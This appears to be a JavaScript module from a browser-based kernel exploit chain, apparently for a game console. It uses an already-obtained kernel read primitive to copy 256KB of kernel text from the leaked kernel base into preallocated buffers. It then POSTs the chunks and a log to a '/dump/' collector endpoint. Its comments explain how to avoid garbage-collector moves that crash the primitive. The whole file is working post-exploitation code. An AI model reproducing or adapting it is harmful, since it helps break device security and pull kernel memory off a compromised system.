// Read-only kernel dump, GC-safe: every buffer is allocated BEFORE the
// first kernel read and nothing is created inside the read loop —
// allocation churn mid-chain lets the GC move the ARW backings and turns
// the primitive's pointers stale (observed as kernel panics).

const PART_SIZE = 0x1000; // stock pipe fill, proven per-op
const PARTS = 64;         // 256KB
const LOG_EVERY = 8;

let log0 = () => {};
let logBuf = [];

function flushLog() {
  if (!logBuf.length) return;
  try {
    fetch("/dump/probe_log.txt", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: new Blob([logBuf.join("\n") + "\n"], { type: "text/plain" }),
    }).catch(() => {});
  } catch (e) {}
  logBuf = [];
}

export async function dumpKernel(result, log) {
  log0 = log;
  const kern = result && result.kern;
  if (!kern || !result.kbase || !kern.kreadFast) {
    log("probe: no kernel context, skipping");
    return;
  }

  const p = kern.p;

  // Phase 1 — allocate everything up front.
  const dst = kern.p.malloc(PART_SIZE, 1);
  const parts = [];
  for (let i = 0; i < PARTS; i++) parts.push(new Uint8Array(PART_SIZE));
  log("probe: preallocated, reading");

  // Phase 2 — reads and extraction only. No allocation, no fetch, no DOM.
  let filled = 0;
  for (let i = 0; i < PARTS; i++) {
    let got = -1;
    try {
      got = await kern.kreadFast(result.kbase.add32(i * PART_SIZE), PART_SIZE, dst);
    } catch (e) {
      break;
    }
    if (got !== PART_SIZE) break;
    const out = parts[i];
    for (let j = 0; j < PART_SIZE; j += 4) {
      const v = p.read4(dst.add32(j));
      out[j] = v & 0xff;
      out[j + 1] = (v >>> 8) & 0xff;
      out[j + 2] = (v >>> 16) & 0xff;
      out[j + 3] = (v >>> 24) & 0xff;
    }
    filled = i + 1;
  }

  log("probe: read " + filled + "/" + PARTS + " parts — posting");
  logBuf.push("read " + filled + "/" + PARTS);

  // Phase 3 — uploads; allocation safe again.
  const stem = "ktext_1360_0x" + result.kbase.toString(16) + "_part";
  let ok = 0;
  for (let i = 0; i < filled; i++) {
    try {
      const r = await fetch("/dump/" + stem + i + ".bin", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: new Blob([parts[i]], { type: "text/plain" }),
      });
      if (r.ok) ok++;
    } catch (e) {}
  }

  log("probe: done, " + ok + "/" + filled + " parts on collector", "info");
  logBuf.push("done " + ok + "/" + filled);
  flushLog();
}
